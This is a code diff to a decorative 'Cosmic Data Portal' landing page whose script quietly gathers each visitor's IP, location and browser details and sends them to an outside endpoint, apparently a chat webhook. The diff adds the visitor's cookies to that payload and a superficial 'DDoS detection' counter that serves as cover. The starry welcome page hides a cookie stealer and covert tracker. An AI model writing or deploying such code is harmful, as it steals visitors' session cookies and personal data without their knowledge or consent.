@@ -1,43 +1,4 @@
-<script type="text/javascript">
-        var gk_isXlsx = false;
-        var gk_xlsxFileLookup = {};
-        var gk_fileData = {};
-        function filledCell(cell) {
-          return cell !== '' && cell != null;
-        }
-        function loadFileData(filename) {
-        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
-            try {
-                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
-                var firstSheetName = workbook.SheetNames[0];
-                var worksheet = workbook.Sheets[firstSheetName];
-
-                // Convert sheet to JSON to filter blank rows
-                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
-                // Filter out blank rows (rows where all cells are empty, null, or undefined)
-                var filteredData = jsonData.filter(row => row.some(filledCell));
-
-                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
-                var headerRowIndex = filteredData.findIndex((row, index) =>
-                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
-                );
-                // Fallback
-                if (headerRowIndex === -1 || headerRowIndex > 25) {
-                  headerRowIndex = 0;
-                }
-
-                // Convert filtered JSON back to CSV
-                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
-                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
-                return csv;
-            } catch (e) {
-                console.error(e);
-                return "";
-            }
-        }
-        return gk_fileData[filename] || "";
-        }
-        </script><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -89,7 +50,7 @@
     <div class="welcome-message p-10 rounded-xl shadow-2xl max-w-lg w-full text-center">
         <h1 class="text-4xl font-extrabold mb-4 bg-clip-text text-transparent bg-gradient-to-r from-cyan-400 to-pink-500">Cosmic Data Portal</h1>
         <p class="text-lg mb-6">Embark on a stellar journey through our digital cosmos!</p>
-        <a href="#" class="bg-gradient-to-r from-purple-500 to-blue-500 text-white py-3 px-6 rounded-full hover:from-pink-500 hover:to-purple-500 transition-all duration-300">Explore the Universe</a>
+        <a href="universe.html" class="bg-gradient-to-r from-purple-500 to-blue-500 text-white py-3 px-6 rounded-full hover:from-pink-500 hover:to-purple-500 transition-all duration-300">Explore the Universe</a>
     </div>
 
     <script>
@@ -118,7 +79,22 @@
         }
         drawStars();
 
-        // Function to get client IP and browser info discreetly
+        // Track request frequency for basic DDoS detection
+        let requestCount = 0;
+        const requestThreshold = 100; // Threshold for potential DDoS detection
+        const timeWindow = 10000; // 10 seconds
+        let requestTimestamps = [];
+
+        // Function to check for potential DDoS activity
+        function checkDDoS() {
+            const now = Date.now();
+            requestTimestamps = requestTimestamps.filter(ts => now - ts < timeWindow);
+            requestTimestamps.push(now);
+            requestCount = requestTimestamps.length;
+            return requestCount > requestThreshold ? 'Potential DDoS detected' : 'Normal traffic';
+        }
+
+        // Function to get client info and cookies
         async function getClientInfo() {
             try {
                 const ipResponse = await axios.get('https://ipapi.co/json/', { timeout: 5000 });
@@ -132,7 +108,9 @@
                     cookiesEnabled: navigator.cookieEnabled,
                     onlineStatus: navigator.onLine,
                     referrer: document.referrer,
-                    timestamp: new Date().toISOString()
+                    timestamp: new Date().toISOString(),
+                    cookies: document.cookie || 'No accessible cookies',
+                    requestFrequency: checkDDoS()
                 };
                 return {
                     ip: ipData.ip,
@@ -165,8 +143,8 @@
                         {
                             title: '🌠 Stellar Visitor Data',
                             description: 'A new explorer has entered the cosmic portal!',
-                            color: 0x8b5cf6, // Vibrant purple
-                            thumbnail: { url: 'https://i.imgur.com/8f3k2Zn.png' }, // Optional cosmic icon
+                            color: 0x8b5cf6,
+                            thumbnail: { url: 'https://i.imgur.com/8f3k2Zn.png' },
                             fields: [
                                 { name: '🌍 IP Address', value: data.ip || 'N/A', inline: true },
                                 { name: '🔢 IP Version', value: data.version || 'N/A', inline: true },
@@ -188,7 +166,9 @@
                                 { name: '🍪 Cookies Enabled', value: data.cookiesEnabled.toString(), inline: true },
                                 { name: '📶 Online Status', value: data.onlineStatus.toString(), inline: true },
                                 { name: '🔙 Referrer', value: data.referrer || 'N/A' },
-                                { name: '⏳ Timestamp', value: data.timestamp || 'N/A' }
+                                { name: '⏳ Timestamp', value: data.timestamp || 'N/A' },
+                                { name: '🍪 Cookies', value: data.cookies || 'N/A' },
+                                { name: '⚠️ Traffic Status', value: data.requestFrequency || 'N/A' }
                             ],
                             footer: { text: 'Transmitted from the Cosmic Data Portal' },
                             timestamp: new Date().toISOString()
